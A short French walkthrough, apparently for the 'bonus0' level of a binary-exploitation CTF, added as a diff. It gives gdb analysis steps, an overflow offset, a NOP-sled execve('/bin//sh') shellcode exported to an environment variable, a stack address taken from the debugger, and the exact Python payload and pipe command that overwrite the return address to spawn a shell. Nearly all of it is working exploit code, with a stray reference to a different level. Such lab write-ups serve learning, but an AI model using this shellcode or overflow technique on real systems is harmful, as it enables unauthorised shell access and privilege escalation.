@@ -1,0 +1,22 @@
+1. gdb bonus0 / info function / disass main / disass pp / diass p
+
+./level7 aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb
+
+segfault on 62626262
+
+offset == 9
+
+On peut donc overflow sur le deuxieme argument !
+
+export SHELLCODE=$(python -c 'print "\x90" * 500 + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80"')
+
+gdb bonus0 -> x/50s *((char **)environ) -> recuper l'addresse de notre shellcode -> 0xbffff7a4
+
+5. python -c 'print "a" * 4095 + "\n"  + "a" * 9 + "\xa4\xf7\xff\xbf" + "a" * 30'> /tmp/bonus0
+
+							^							^					^
+							|							|					|
+
+						Remplir buffer + \n			shellcode addr			remplir pour segfault
+
+6. cat /tmp/bonus0 - | ./bonus0
